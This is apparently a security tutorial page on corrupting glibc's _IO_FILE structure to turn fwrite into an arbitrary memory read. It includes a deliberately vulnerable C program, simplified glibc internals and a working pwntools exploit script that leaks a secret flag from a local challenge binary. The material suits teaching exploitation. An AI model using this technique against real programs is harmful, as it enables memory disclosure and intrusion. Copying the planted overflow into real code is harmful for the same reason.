#metadata(
  (
    title: "Arbitrary Read (fwrite)",
    description: "Corrupting the _IO_FILE structure to leak data from arbitrary memory addresses.",
    date: "2026-01-02",
    order: 3,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

== Prerequisites
- *Memory Corruption*: Ability to overwrite a `FILE` structure.
- *Known Address*: Knowledge of the address of the data you want to leak (e.g., a flag or a stack/libc pointer).
- *Output Stream*: A standard library call that triggers a flush (e.g., `fwrite`, `fputs`, `fflush`, or `fclose`).

= Arbitrary Read via FILE Structure Corruption

The `FILE` structure's buffer pointers determine where data is read from and written to during I/O operations. By corrupting these pointers, an attacker can transform a standard library call like `fwrite` into a powerful arbitrary memory leak primitive.

== Vulnerable Scenario

Consider a program that allows an overflow into a `FILE` structure or a pointer to one. In the example below, a `read` call directly overwrites the `fp` object's memory.

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char secret[0x100];
FILE *fp;
char *buf;

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  strcpy(secret, "FLAG{THIS_IS_A_SECRET_FLAG}\n");
  printf("The secret is located at %p\n", secret);

  buf = malloc(0x100);
  fp = fopen("/tmp/uiiaiiuuiiai.txt", "w");

  // The vulnerability: 0x1e0 bytes overflow into the FILE structure
  read(0, fp, 0x1e0);

  // This call will now use our corrupted structure
  fwrite(buf, 1, 0x100, fp);
  return 0;
}
```

== Glibc Internals: `_IO_new_file_overflow`

When `fwrite` is called, it eventually invokes `_IO_new_file_overflow` if it determines the buffer needs flushing. To reach the arbitrary write primitive (`_IO_do_write`), we must satisfy several internal checks.

```c
// Simplified glibc/libio/fileops.c
int _IO_new_file_overflow (FILE *f, int ch)
{
  // [1] Check permissions to skip this
  if (f->_flags & _IO_NO_WRITES)
    return EOF;

  // [2] Ensure we are in 'putting' mode and have a valid base to skip this
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
  {
    /* ... (code that might reset pointers) ... */
  }

  // [3] Goal: Trigger _IO_do_write with controlled pointers
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
}
```

Further down, `_IO_do_write` (or `new_do_write`) performs another critical check:

```c
static size_t new_do_write (FILE *fp, const char *data, size_t to_do)
{
  // [4] Avoid appending mode logic
  if (fp->_flags & _IO_IS_APPENDING) { /* ... */ }

  // [5] Crucial constraint: bypass buffer adjustment
  else if (fp->_IO_read_end != fp->_IO_write_base) { /* ... */ }

  // [6] The Primitive: System call write(fp->_fileno, data, to_do)
  return _IO_SYSWRITE (fp, data, to_do);
}
```

== Exploitation Strategy

To leak the `secret` string, we must craft the `FILE` structure to meet these conditions:

1. *`_flags`*:
  - Clear `_IO_NO_WRITES` (`0x0008`).
  - Set `_IO_CURRENTLY_PUTTING` (`0x0800`).
  - A common safe value is `0xfbad0000 | 0x800` (incorporating `_IO_MAGIC`).
2. *`_IO_write_base`*: Points to the start of the memory we want to read (`secret`).
3. *`_IO_write_ptr`*: Points to the end of the memory we want to read (`secret + length`).
4. *`_IO_read_end`*: Must be exactly equal to `_IO_write_base` to satisfy the check in `new_do_write`.
5. *`_fileno`*: Set to `1` (stdout) or another descriptor we can monitor.

== Exploit Script

```python
from pwn import *

p = process("./challenge")

p.recvuntil(b"located at ")
secret_addr = int(p.recvline().strip(), 16)
info(f"Secret address: {hex(secret_addr)}")

# Crafting the fake FILE structure
payload = flat({
    0x00: p64(0xfbad0000 | 0x800), # _flags: MAGIC + CURRENTLY_PUTTING
    0x10: p64(secret_addr),        # _IO_read_end (must == _IO_write_base)
    0x20: p64(secret_addr),        # _IO_write_base (start of leak)
    0x28: p64(secret_addr + 0x100),# _IO_write_ptr (end of leak)
    0x70: p32(1),                  # _fileno (stdout)
}, filler=b"\x00")

p.send(payload)
print(p.recvall(timeout=2))
```
